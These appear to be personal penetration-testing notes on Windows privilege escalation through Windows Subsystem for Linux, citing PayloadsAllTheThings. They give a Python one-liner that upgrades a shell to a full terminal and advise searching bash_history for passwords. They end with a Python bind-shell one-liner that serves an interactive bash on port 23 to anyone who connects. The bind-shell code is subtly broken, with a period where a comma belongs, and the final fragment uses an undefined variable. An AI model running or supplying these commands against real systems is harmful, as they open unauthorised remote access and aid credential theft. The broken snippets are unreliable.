# Windows Subsystem for Linux



[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---windows-subsystem-for-linux-wsl](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md#eop---windows-subsystem-for-linux-wsl)

- With root privs, WSL allows users to create a bind shell on any port

- look for bash.exe, wsl.exe

```
wsl whoami
```

```
bash.exe whoami
```

- Elevate to TTY

```
python -c "import pty;pty.spawn('/bin/bash')"
```

- Look for Linux Priv esc stuff that might apply
  - bash_history for passwords etc



- Bind shell

```
wsl python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((''.23));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"
```

```
import pty,os;os.dup2(r.fileno(),0);os.dup2(r.fileno(),1);os.dup2(r.fileno(),2);pty.spawn("/bin/bash");s.close()

```

